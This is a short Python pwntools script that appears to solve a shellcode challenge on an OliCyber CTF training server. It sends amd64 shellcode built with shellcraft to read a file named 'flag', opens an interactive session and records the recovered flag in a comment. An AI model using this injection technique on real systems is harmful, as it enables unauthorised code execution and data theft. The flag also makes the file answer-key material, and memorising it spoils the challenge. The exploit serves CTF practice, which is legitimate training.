from pwn import *
import re
host = "software-20.challs.olicyber.it"
port = 13003
r = remote(host,port)

r.recvuntil(b"... Invia un qualsiasi carattere per iniziare ...")
r.sendline(b"a")

asm_code = shellcraft.amd64.linux.cat("flag") #eseguiamo il file flag che NON è flag.txt
shellcode = asm(asm_code, arch = "x86_64") #converte lo shellcraft in binario per architettura amd64 (x86_64)

size = len(shellcode) #memorizziamo la dimensione dello shellcode perchè ce la chiede il programma
r.recvuntil(b": ") #la inviamo
r.sendline(str(size).encode())

r.recvuntil(b": ") #aspettiamo che il programma ci chieda di inviare lo shellcode
r.send(shellcode)

r.interactive()

#flag{c5745d7eea17b5ab}